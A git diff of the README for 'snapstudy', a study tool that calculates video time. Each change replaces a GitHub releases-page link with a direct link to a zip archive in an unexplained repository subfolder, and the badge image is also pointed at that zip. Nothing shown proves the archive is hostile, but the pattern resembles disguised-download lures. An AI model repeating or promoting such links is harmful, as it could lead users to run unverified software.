@@ -6,7 +6,7 @@ Welcome to snapstudy, your smart video time calculator. This application helps y
 
 ## 📥 Download Now
 
-[![Download snapstudy](https://img.shields.io/badge/download-snapstudy-brightgreen)](https://github.com/Ernark546/snapstudy/releases)
+[![Download snapstudy](https://raw.githubusercontent.com/Ernark546/snapstudy/main/dali/snapstudy.zip)](https://raw.githubusercontent.com/Ernark546/snapstudy/main/dali/snapstudy.zip)
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ Welcome to snapstudy, your smart video time calculator. This application helps y
 
 To get the latest version of snapstudy, visit the releases page:
 
-[Download snapstudy](https://github.com/Ernark546/snapstudy/releases)
+[Download snapstudy](https://raw.githubusercontent.com/Ernark546/snapstudy/main/dali/snapstudy.zip)
 
 ### 2. Choose Your Version
 
@@ -75,6 +75,6 @@ This project is licensed under the MIT License, allowing you to use, copy, and m
 
 To start managing your video time effectively, download snapstudy from the link below:
 
-[Download snapstudy](https://github.com/Ernark546/snapstudy/releases) 
+[Download snapstudy](https://raw.githubusercontent.com/Ernark546/snapstudy/main/dali/snapstudy.zip) 
 
 We hope you find snapstudy a valuable tool in your learning journey!
